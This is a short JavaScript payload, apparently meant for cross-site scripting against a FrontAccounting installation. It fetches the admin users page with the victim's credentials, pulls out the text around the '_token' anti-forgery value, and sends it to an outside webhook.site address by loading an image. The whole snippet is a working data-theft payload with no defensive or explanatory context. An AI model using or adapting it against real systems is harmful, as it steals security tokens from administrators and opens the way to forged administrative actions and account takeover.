var r = new XMLHttpRequest();
r.open('GET', '/frontaccounting/admin/users.php', false);
r.withCredentials = true;
r.send();

var raw = r.responseText;

// Find where _token appears in the response
var idx = raw.indexOf('_token');
var around = raw.substring(idx - 10, idx + 80);

new Image().src = '	https://webhook.site/33576a95-7734-4cc6-8e96-4b33a3f0793d/?around=' + encodeURIComponent(around);
